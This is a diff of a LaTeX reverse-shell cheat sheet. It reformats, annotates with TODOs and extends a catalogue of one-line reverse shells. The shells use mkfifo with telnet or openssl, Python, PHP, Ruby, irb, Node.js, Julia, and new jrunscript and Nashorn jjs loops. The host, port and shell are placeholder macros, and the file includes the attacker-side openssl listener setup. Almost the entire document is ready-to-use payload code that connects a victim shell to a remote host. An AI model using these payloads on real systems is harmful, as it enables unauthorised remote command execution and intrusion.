@@ -105,12 +105,14 @@ mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | telnet ^\host^ ^\port^ > ^\file^; rm ^
 \begin{cmdline}{bash}{|}{socket}{}
 socket -qvp '|\shell|' |\host| |\port|
 \end{cmdline}
+\TODO{dependencies}
 
 \subsection{OpenSSL (\texttt{openssl})}
 
 \begin{cmdline}{bash}{^}{mkfifo, openssl}{}
 mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | openssl s_client -quiet -connect ^\host^:^\port^ > ^\file^; rm ^\file^
 \end{cmdline}
+\TODO{dependencies}
 
 \TODO{describe/explain commands that need to be run on attacker machine:}
 
@@ -118,6 +120,7 @@ mkfifo ^\file^; ^\shell^ < ^\file^ 2>&1 | openssl s_client -quiet -connect ^\hos
 openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 openssl s_server -quiet -key key.pem -cert cert.pem -port |\port|
 \end{cmdline}
+\TODO{dependencies}
 
 
 \section{Programming languages interpreters}
@@ -125,7 +128,7 @@ openssl s_server -quiet -key key.pem -cert cert.pem -port |\port|
 \subsection{Python (\texttt{python/python3})}
 
 \begin{cmdline}{bash}{|}{python}{}
-python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("|\host|",|\port|)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["|\shell|"]);'
+python -c 'import socket,subprocess,os; s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("|\host|",|\port|)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call(["|\shell|"]);'
 \end{cmdline}
 \TODO{dependencies}
 
@@ -139,7 +142,7 @@ perl -e 'use Socket; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(con
 \subsection{PHP (\texttt{php})}
 
 \begin{cmdline}{bash}{|}{php}{}
-php -r '$sock=fsockopen("|\host|",|\port|); exec("|\shell| <&3 >&3 2>&3");'
+php -r '$sock = fsockopen("|\host|",|\port|); exec("|\shell| <&3 >&3 2>&3");'
 \end{cmdline}
 %$
 \TODO{dependencies}
@@ -147,27 +150,44 @@ php -r '$sock=fsockopen("|\host|",|\port|); exec("|\shell| <&3 >&3 2>&3");'
 \subsection{Ruby (\texttt{ruby})}
 
 \begin{cmdline}{bash}{^}{ruby}{}
-ruby -rsocket -e 'exit if fork; c=TCPSocket.new("^\host^",^\port^); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end'
+ruby -rsocket -e 'exit if fork; c = TCPSocket.new("^\host^",^\port^); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end'
 \end{cmdline}
 \TODO{dependencies}
 
 \subsubsection{Interactive Ruby Shell (\texttt{irb})}
 
 \begin{cmdline}{bash}{^}{echo,irb}{}
-echo 'require "socket"; exit if fork; c=TCPSocket.new("^\host^",^\port^); while(cmd=c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' | irb
+echo 'require "socket"; exit if fork; c = TCPSocket.new("^\host^",^\port^); while(cmd = c.gets); IO.popen(cmd,"r"){|io|c.print io.read} end' | irb
 \end{cmdline}
 \TODO{dependencies}
 
-\subsection{Node.js (\texttt{node})}
+\subsection{JavaScript runtime environments}
+
+\subsubsection{Node.js (\texttt{node})}
 
 \begin{cmdline}{bash}{|}{node}{}
 node -e 'shell = require("child_process").spawn("|\shell|"); require("net").connect(|\port|, "|\host|", function () { this.pipe(shell.stdin); shell.stdout.pipe(this); shell.stderr.pipe(this); })'
 \end{cmdline}
+\TODO{dependencies}
+
+\subsubsection{Generic scripting engine (\texttt{jrunscript})}
+
+\begin{cmdline}{bash}{^}{jrunscript}{}
+jrunscript -e 'var p = new java.lang.ProcessBuilder("^\shell^").redirectErrorStream(true).start(); var s = new java.net.Socket("^\host^",^\port^); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();'
+\end{cmdline}
+\TODO{dependencies}
+
+\subsubsection{Nashorn engine (\texttt{jjs})}
+
+\begin{cmdline}{bash}{^}{echo,jjs}{}
+echo 'var p = new java.lang.ProcessBuilder("^\shell^").redirectErrorStream(true).start(); var s = new java.net.Socket("^\host^",^\port^); var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream(); var po = p.getOutputStream(), so = s.getOutputStream(); while(!s.isClosed()){ while(pi.available()>0) so.write(pi.read()); while(pe.available()>0) so.write(pe.read()); while(si.available()>0) po.write(si.read()); so.flush(); po.flush(); java.lang.Thread.sleep(50); try { p.exitValue(); break; } catch (e){}}; p.destroy(); s.close();' | jjs
+\end{cmdline}
+\TODO{dependencies}
 
 \subsection{Julia (\texttt{julia})}
 
 \begin{cmdline}{bash}{|}{julia}{}
-julia -e 'using Sockets; sock=connect("|\host|", parse(Int64,"|\port|")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
+julia -e 'using Sockets; sock = connect("|\host|", parse(Int64,"|\port|")); while true; cmd = readline(sock); if !isempty(cmd); cmd = split(cmd); ioo = IOBuffer(); ioe = IOBuffer(); run(pipeline(`$cmd`, stdout=ioo, stderr=ioe)); write(sock, String(take!(ioo)) * String(take!(ioe))); end; end;'
 \end{cmdline}
 %$
 \TODO{dependencies}
